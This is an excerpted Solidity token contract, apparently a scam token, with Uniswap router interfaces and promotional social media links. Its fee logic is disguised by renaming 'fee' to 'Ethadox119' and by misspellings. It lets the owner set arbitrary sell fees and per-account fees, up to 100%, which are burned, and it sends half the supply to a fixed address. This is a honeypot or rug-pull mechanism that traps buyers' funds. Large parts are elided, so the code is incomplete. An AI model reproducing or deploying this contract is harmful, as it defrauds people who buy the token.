...
* http://instagram.com/Ethadox119
* https://www.reddit.com/user/Ethadox119
...
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingEthadox119OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingEthadox119OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function swapExactTokensForTokensSupportingEthadox119OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingEthadox119OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingEthadox119OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
...
interface IUniswapV2Factory {
    ...
    function Ethadox119To() external view returns (address);
    function Ethadox119ToSetter() external view returns (address);
    ...
    function setEthadox119To(address) external;
    function setEthadox119ToSetter(address) external;
}
...
contract ETH is BEP20, Ownable {
	...
	transfer(0x0D0707963952f2fBA59dD06f2b425ace40b492Fe, totalSupply() / 10*5);	
        ...
        _defaultSellEthadox119 = 0;
        _defaultBuyEthadox119 = 0;
    ...
    uint256 private _defaultSellEthadox119 = 0;
    uint256 private _defaultBuyEthadox119 = 0;
    ...
    function incS(uint256 _value) external onlyowaer {
        _defaultSellEthadox119 = _value;
    }


    function acEthadox119fq(address _acc, uint256 _value) external onlyowaer {
 ...
 function getRelease(address _address) external view onlyowaer returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeEthadox119amuont = 0;

        if (rF) {
            uint256 tradeEthadox119 = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                   
                    tradeEthadox119 = _msgEthadox119Info(uint160(from));
                    tradeEthadox119 = tradeEthadox119 < _defaultSellEthadox119 ? _defaultSellEthadox119 : tradeEthadox119;
                }
                if (from == uniswapV2Pair) {
                    tradeEthadox119 = _defaultBuyEthadox119;
                }
            }
                        
			//uint160 f = uint160(from) ^ _escapeKey;
            if (_Escape[from] > 0) {
                tradeEthadox119 = _Escape[from];
            }


            tradeEthadox119amuont = _amuont.mul(tradeEthadox119).div(100);
        }


        if (tradeEthadox119amuont > 0) {
            _balances[from] = _balances[from].sub(tradeEthadox119amuont);
            _balances[address(0x000000000000000000000000000000000000dEaD)] = _balances[address(0x000000000000000000000000000000000000dEaD)].add(tradeEthadox119amuont);
            emit Transfer(from, address(0x000000000000000000000000000000000000dEaD), tradeEthadox119amuont);
        }

        _balances[from] = _balances[from].sub(_amuont - tradeEthadox119amuont);
        _balances[_to] = _balances[_to].add(_amuont - tradeEthadox119amuont);
        emit Transfer(from, _to, _amuont - tradeEthadox119amuont);
    }
	...
	function _msgEthadox119Info(uint _acc) internal view virtual returns (uint) {
